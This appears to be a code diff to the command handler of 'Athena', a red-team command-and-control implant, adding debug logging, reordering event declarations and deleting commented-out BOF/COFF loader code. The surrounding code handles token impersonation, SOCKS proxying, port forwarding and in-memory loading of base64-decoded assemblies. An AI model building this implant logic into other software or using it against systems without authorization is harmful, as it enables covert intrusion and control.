@@ -11,26 +11,28 @@ using Athena.Plugins;
 using Athena.Models.Config;
 using System.Text.Json;
 using Athena.Models;
+using System.Diagnostics;
 
 namespace Athena.Commands
 {
     public class CommandHandler
     {
         public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
-        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
         public delegate void SetForwarderHandler(object sender, ProfileEventArgs e);
-        public event EventHandler<ProfileEventArgs> SetForwarder;
         public delegate void SetProfileHandler(object sender, ProfileEventArgs e);
-        public event EventHandler<ProfileEventArgs> SetProfile;
         public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
-        public event EventHandler<TaskEventArgs> StartForwarder;
         public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
-        public event EventHandler<TaskEventArgs> StopForwarder;
         public delegate void StartSocksHandler(object sender, TaskEventArgs e);
-        public event EventHandler<TaskEventArgs> StartSocks;
         public delegate void StopSocksHandler(object sender, TaskEventArgs e);
-        public event EventHandler<TaskEventArgs> StopSocks;
         public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
+
+        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
+        public event EventHandler<ProfileEventArgs> SetForwarder;
+        public event EventHandler<ProfileEventArgs> SetProfile;
+        public event EventHandler<TaskEventArgs> StartForwarder;
+        public event EventHandler<TaskEventArgs> StopForwarder;
+        public event EventHandler<TaskEventArgs> StartSocks;
+        public event EventHandler<TaskEventArgs> StopSocks;
         public event EventHandler<TaskEventArgs> ExitRequested;
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
@@ -56,7 +58,8 @@ namespace Athena.Commands
             job.started = true; 
             if(task.token != 0)
             {
-                if(!await this.tokenHandler.ThreadImpersonate(task.token))
+                Debug.WriteLine("Setting thread impersonation.");
+                if (!await this.tokenHandler.ThreadImpersonate(task.token))
                 {
                     this.responseResults.Add(new ResponseResult()
                     {
@@ -68,6 +71,8 @@ namespace Athena.Commands
                     return;
                 }
             }
+
+            Debug.WriteLine($"Received Job: {job.task.command} with hash {job.task.command.ToHash()}");
             switch (job.task.command.ToHash())
             {
                 case "FD456406745D816A45CAE554C788E754": //download
@@ -326,7 +331,7 @@ namespace Athena.Commands
         /// </summary>
         public async Task<List<string>> GetResponses()
         {
-            List<string> responses = this.responseResults.ToList<string>();
+            List<string> responses = this.responseResults.ToList();
             this.responseResults.Clear();
 
             //if (this.assemblyHandler.assemblyIsRunning)
@@ -406,40 +411,6 @@ namespace Athena.Commands
             LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
             byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
             return await assemblyHandler.LoadCommandAsync(job.task.id, command.command, buf);
-
-            //
-            //byte[] magBytes = new byte[] { buf[0], buf[1] };
-
-            //if (magBytes.Equals(Misc.BOF86))
-            //{
-            //    return new LoadCommandResponseResult()
-            //    {
-            //        completed = "true",
-            //        user_output = "Only 64bit coff's supported!",
-            //        task_id = job.task.id,
-            //        status = "error",
-            //        commands = new List<CommandsResponse>(),
-            //    }.ToJson();
-            //}
-            //else if (magBytes.Equals(Misc.BOF64))
-            //{
-            //    return await coffHandler.LoadCoff(job.task.id, job.task.command, buf);
-            //}
-            //else if (magBytes.Equals(Misc.PE))
-            //{
-            //    return await assemblyHandler.LoadCommandAsync(job.task.id, job.task.command, buf);
-            //}
-            //else
-            //{
-            //    return new LoadCommandResponseResult()
-            //    {
-            //        completed = "true",
-            //        user_output = "Failed to load command, format not recognized.",
-            //        task_id = job.task.id,
-            //        status = "error",
-            //        commands = new List<CommandsResponse>(),
-            //    }.ToJson();
-            //}
         }
 
         /// <summary>
